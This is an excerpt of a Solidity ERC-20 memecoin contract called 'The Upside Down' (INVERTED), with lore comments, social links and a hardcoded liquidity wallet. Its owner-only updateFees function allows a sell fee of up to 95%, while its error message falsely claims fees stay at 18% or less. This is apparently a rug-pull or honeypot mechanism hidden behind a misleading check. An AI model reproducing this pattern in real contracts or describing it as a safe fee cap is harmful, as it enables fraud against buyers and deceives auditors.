...
/**
The Upside Down is an alternate dimension that mirrors our world — 
or at least our world if it was a toxic hellscape overrun with creepy, moving vines, 
filled with murderous creatures linked together in a hive mind system, 
and is constantly experiencing electrical storms.

Inverted minds, Colonazing wars, Spreading rumors all of it will end in upside down.
*/

/*
https://t.me/upsidedownerc
TG : @upsidedownerc
Website:https://upsidedown.com
Twitter: https://upside_down
*/
...
contract INVERTED is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "The Upside Down";
    string private constant _symbol = "INVERTED";
    ...
    address payable private liqAddress = payable(0xEA1BA0e190919C0deF8c9888Ea40740f84C94B56);
    ...
    function updateFees(uint256 liqSell) external onlyOwner {
        j_liqSell = liqSell;
        require(liqSell <= 95, "Must keep fees at 18% or less");
    }
